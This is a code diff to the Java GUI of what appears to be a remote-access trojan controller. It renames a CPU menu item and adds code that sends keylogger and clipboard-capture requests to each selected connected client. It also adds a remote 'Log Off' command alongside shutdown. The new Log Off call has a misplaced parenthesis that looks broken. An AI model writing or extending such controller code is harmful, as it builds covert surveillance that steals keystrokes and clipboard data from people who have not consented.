@@ -118,7 +118,7 @@ public class GuiMain extends JFrame {
                 }
             }
         }));
-        jPopupMenu.add(createAction("CPU Usage", MessageType.PERFORMANCE_TRACK, new ActionListener() {
+        jPopupMenu.add(createAction("Performance", MessageType.PERFORMANCE_TRACK, new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
                 Packet p = new Packet();
@@ -132,7 +132,7 @@ public class GuiMain extends JFrame {
                     } catch (Exception ex) {
                         System.out.println("Failed to send start tracking packet");
                     }
-                    cc.OpenCpuView();
+                    cc.OpenPerformanceView();
                 }
             }
         }));
@@ -141,6 +141,15 @@ public class GuiMain extends JFrame {
             public void actionPerformed(ActionEvent arg0) {
                 for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                     cc.OpenKeyLogView();
+                    try {
+                        Packet p = new Packet();
+                        p.action = MessageType.KEYLOGGER.getID();
+                        NetUtils.sendMessage(p, cc.getPrintWriter());
+                        p.action = MessageType.CLIPBOARD.getID();
+                        NetUtils.sendMessage(p, cc.getPrintWriter());
+                    } catch (Exception e) {
+                        System.out.println("Cannot send keylogger and clipboard data request");
+                    }
                 }
             }
 
@@ -150,6 +159,14 @@ public class GuiMain extends JFrame {
             public void actionPerformed(ActionEvent e) {
                 for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                     cc.SendShutDown(cc.getPrintWriter());
+                }
+            }
+        });
+        jPopupMenu.add(createAction("Log Off", MessageType.LOGOFF), new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+                    cc.SendLogOff(cc.getPrintWriter());
                 }
             }
         });
